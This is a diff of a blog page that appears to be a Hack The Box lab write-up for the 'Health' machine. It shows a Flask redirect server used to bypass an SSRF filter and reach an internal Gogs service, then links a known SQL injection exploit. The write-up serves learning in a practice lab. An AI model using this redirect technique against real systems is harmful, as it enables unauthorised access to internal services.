@@ -101,7 +101,28 @@ ID           Response   Lines    Word       Chars       Payload
 =====================================================================
 
 000000689:   400        10 L     35 W       301 Ch      &#34;gc._msdcs&#34;
-</code></pre><h2 id=foothold>Foothold</h2><ul><li>I set my ip on both <code>url</code> links<ul><li>Both urls are requested</li></ul></li></ul><p><img src=./images/2.png alt></p><ul><li>I&rsquo;ll listen with <code>nc</code></li></ul><p><img src=./images/3.png alt></p><ul><li>I&rsquo;ll try to host <code>Monitored URL</code> via <code>python</code> and listen to <code>Payload URL</code> on <code>nc</code></li></ul><p><img src=./images/4.png alt></p></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
+</code></pre><h2 id=foothold>Foothold</h2><ul><li>I set my ip on both <code>url</code> links<ul><li>Both urls are requested</li></ul></li></ul><p><img src=./images/2.png alt></p><ul><li>I&rsquo;ll listen with <code>nc</code></li></ul><p><img src=./images/3.png alt></p><ul><li>I&rsquo;ll try to host <code>Monitored URL</code> via <code>python</code> and listen to <code>Payload URL</code> on <code>nc</code></li></ul><p><img src=./images/4.png alt></p><ul><li>If try entering <code>localhost</code>, it returns error<ul><li>The reason was to check if I could perform <code>SSRF</code> on port <code>3000</code> which is filtered</li><li>We can launch some <code>flask</code> app which will try to redirect to port <code>3000</code> and see if it works</li></ul></li></ul><pre tabindex=0><code>from flask import Flask, redirect, request
+
+app = Flask(__name__)
+
+
+@app.route(&#34;/&#34;, methods=[&#34;GET&#34;])
+def r():
+    url = request.args.get(&#34;url&#34;)
+    return redirect(url, code=302)
+
+
+if __name__ == &#34;__main__&#34;:
+    app.run(debug=True, host=&#34;0.0.0.0&#34;, port=80)
+</code></pre><pre tabindex=0><code>└─$ python3 app.py                                                                                                                
+ * Serving Flask app &#39;app&#39;
+ * Debug mode: on
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:80
+ * Running on http://10.0.2.15:80
+&lt;SNIP&gt;
+</code></pre><ul><li>We succesfully performed <code>SSRF</code></li></ul><p><img src=./images/5.png alt></p><ul><li>Let&rsquo;s test it on port <code>3000</code></li></ul><p><img src=./images/6.png alt></p><ul><li>It&rsquo;s a <code>GoGits Version: 0.5.5.1010 Beta</code><ul><li>There is <code>sqli</code> in that specific version<ul><li><a href=https://www.exploit-db.com/exploits/35238 target=_blank rel=noopener>https://www.exploit-db.com/exploits/35238</a></li></ul></li><li></li></ul></li></ul></div><div class="row pl-3 pr-3"><div class="col-md-6 share-buttons"><strong>Share on:</strong>
 <a class="btn btn-sm twitter-btn" href="https://twitter.com/share?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2fhealth%2f&text=%5bHTB%5d%20Machine%3a%20Health&via=Personal%20Blog" target=_blank><i class="fab fa-twitter"></i>
 </a><a class="btn btn-sm reddit-btn" href="https://reddit.com/submit?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2fhealth%2f&title=%5bHTB%5d%20Machine%3a%20Health" target=_blank><i class="fab fa-reddit"></i>
 </a><a class="btn btn-sm linkedin-btn" href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2fumarbaevb.github.io%2fposts%2fcybersecurity%2fhackthebox%2fmachines%2flinux%2fhealth%2f&title=%5bHTB%5d%20Machine%3a%20Health" target=_blank><i class="fab fa-linkedin"></i>
